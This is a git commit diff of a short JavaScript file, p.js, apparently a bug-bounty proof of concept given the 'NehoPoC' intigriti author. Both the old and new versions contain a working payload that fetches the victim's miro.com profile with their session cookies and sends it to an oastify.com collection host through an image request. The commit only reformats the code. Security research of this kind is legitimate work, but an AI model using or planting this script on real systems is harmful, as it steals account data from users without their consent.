20d3b49e755bb4d3f1992f97ba764428d8c66fb6
NehoPoC <neho-poc1@intigriti.me>
2025-08-06 17:07:10 +0100

    Update p.js

--- p.js
+++ p.js
@@ -1,21 +1,21 @@
 (() => {
-		fetch("https://miro.com/api/v1/profile/", {
-			method: "GET",
-			credentials: "include"
-		})
-			.then(res => res.json())
-			.then(profileData => {
-				const {
-					achievements,
-					subscriptions,
-					toolbarPlugins,
-					interests,
-					betaFeatures,
-					...slimProfileData
-				} = profileData;
-				const img = new Image();
-				img.src = "qe8uw9sj172633tw07dv120wcnie6hu6.oastify.com" +
-					encodeURIComponent(JSON.stringify(slimProfileData));
-			})
-			.catch(err => console.error("Profile fetch failed or blocked:", err));
-	})();
+  fetch("https://miro.com/api/v1/profile/", {
+    method: "GET",
+    credentials: "include"
+  })
+    .then(res => res.json())
+    .then(profileData => {
+      const {
+        achievements,
+        subscriptions,
+        toolbarPlugins,
+        interests,
+        betaFeatures,
+        ...slimProfileData
+      } = profileData;
+
+      const img = new Image();
+      img.src = "qe8uw9sj172633tw07dv120wcnie6hu6.oastify.com" + encodeURIComponent(JSON.stringify(slimProfileData));
+    })
+    .catch(err => console.error("Profile fetch failed or blocked:", err));
+})();
